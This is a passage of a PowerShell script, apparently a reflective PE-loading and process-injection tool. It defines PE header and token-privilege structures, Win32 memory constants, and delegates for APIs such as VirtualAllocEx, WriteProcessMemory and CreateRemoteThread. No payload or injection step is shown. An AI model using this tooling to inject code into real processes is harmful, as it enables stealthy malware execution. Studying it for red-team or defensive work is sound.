        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()    
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
